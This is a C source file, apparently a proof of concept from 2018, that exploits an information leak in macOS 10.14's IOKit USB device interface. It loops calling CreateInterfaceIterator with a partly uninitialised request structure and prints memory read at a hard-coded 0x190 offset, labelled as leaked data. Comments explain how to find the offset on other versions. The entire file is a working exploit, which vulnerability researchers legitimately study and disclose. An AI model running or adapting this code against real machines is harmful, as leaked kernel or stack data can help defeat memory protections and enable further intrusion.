//
//  main.c
//  msg_test
//
//  Created by maldiohead on 2018/12/10.
//  Copyright © 2018 maldiohead. All rights reserved.
//


#include <ctype.h>
#include <stdlib.h>
#include <assert.h>
#include <limits.h>
#include <mach/mach_interface.h>
#include <mach/vm_region.h>
#include <mach/thread_switch.h>
#include <mach/clock_types.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/hidsystem/IOHIDShared.h>
#include <IOKit/graphics/IOFramebufferShared.h>
#include <IOKit/graphics/IOGraphicsEngine.h>
#include <IOKit/graphics/IOGraphicsLib.h>
#include<CoreFoundation/CoreFoundation.h>
#include <IOKit/usb/USB.h>

int main() {
    
    io_iterator_t iter;
 kern_return_t err=IOServiceGetMatchingServices( kIOMasterPortDefault,
                                                IOServiceMatching( "IOUSBDevice" ), &iter);
    if(err)
    {
        printf("[!]can't find the service!\n");
        return 0;
    }
    
    io_service_t service=IOIteratorNext(iter);
    if(!service)
    {
        printf("[!]can' get service!\n");
        return 0;
    }
    SInt32 score;
    IOCFPlugInInterface** plugin;
    
    
    IOUSBDeviceInterface300** usbDevice=NULL;
    err=IOCreatePlugInInterfaceForService(service, kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID, &plugin, &score);
    
    if (err) {
        printf("[!]can't create plugin interface!\n");
        return 0;
    }
    
    (*plugin)->QueryInterface(plugin,CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID300),(LPVOID)&usbDevice);
    IODestroyPlugInInterface(plugin);
    io_iterator_t interfaceIterator;
    IOUSBFindInterfaceRequest interfaceRequest;
    interfaceRequest.bInterfaceClass=kIOUSBFindInterfaceDontCare;
    interfaceRequest.bInterfaceSubClass=kIOUSBFindInterfaceDontCare;
    interfaceRequest.bAlternateSetting=kIOUSBFindInterfaceDontCare;
    interfaceRequest.bAlternateSetting=kIOUSBFindInterfaceDontCare;
    
    
    while (1) {
        err=(*usbDevice)->CreateInterfaceIterator(usbDevice,&interfaceRequest,&interfaceIterator);
        
        // hard code 0x190 is just the offset of the leaked data.this is macOS 10.14.0 offset. may be you need get the offset by your self.
        // you can debug the poc and then  get the offset 
        printf("[*]addr:%lx  leaked data %x\n",(uint64_t)(&interfaceIterator)-0x190,*(uint64_t*)((uint64_t)(&interfaceIterator)-0x190));
        sleep(1); 
    }
    return 0;
}

